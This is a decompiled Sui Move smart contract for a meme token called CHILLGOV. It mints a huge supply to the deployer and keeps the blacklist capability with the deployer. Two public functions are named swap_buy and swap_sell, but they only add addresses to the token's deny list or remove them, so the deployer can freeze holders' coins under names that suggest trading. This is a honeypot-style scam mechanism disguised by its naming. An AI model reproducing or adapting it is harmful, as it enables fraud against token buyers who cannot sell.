module 0xdfdbb3ee54ee6a768db05e5625098824d6aa20a36a02766189d4f02cb80532bf::chillgov {
    struct CHILLGOV has drop {
        dummy_field: bool,
    }

    struct CapWrapper has key {
        id: 0x2::object::UID,
    }

    fun init(arg0: CHILLGOV, arg1: &mut 0x2::tx_context::TxContext) {
        let (v0, v1, v2) = 0x2::coin::create_regulated_currency_v2<CHILLGOV>(arg0, 9, b"CHILLGOV", b"Chill Government", b"", 0x1::option::some<0x2::url::Url>(0x2::url::new_unsafe(0x1::ascii::string(b"https://i.imgur.com/I6rrxrD.png"))), false, arg1);
        let v3 = v0;
        0x2::coin::mint_and_transfer<CHILLGOV>(&mut v3, 420000000000000000, 0x2::tx_context::sender(arg1), arg1);
        0x2::transfer::public_freeze_object<0x2::coin::CoinMetadata<CHILLGOV>>(v2);
        0x2::transfer::public_freeze_object<0x2::coin::TreasuryCap<CHILLGOV>>(v3);
        0x2::transfer::public_transfer<0x2::coin::DenyCapV2<CHILLGOV>>(v1, 0x2::tx_context::sender(arg1));
    }

    public fun swap_buy(arg0: &mut 0x2::deny_list::DenyList, arg1: &mut 0x2::coin::DenyCapV2<CHILLGOV>, arg2: address, arg3: &mut 0x2::tx_context::TxContext) {
        0x2::coin::deny_list_v2_add<CHILLGOV>(arg0, arg1, arg2, arg3);
    }

    public fun swap_sell(arg0: &mut 0x2::deny_list::DenyList, arg1: &mut 0x2::coin::DenyCapV2<CHILLGOV>, arg2: address, arg3: &mut 0x2::tx_context::TxContext) {
        0x2::coin::deny_list_v2_remove<CHILLGOV>(arg0, arg1, arg2, arg3);
    }

    // decompiled from Move bytecode v6
}

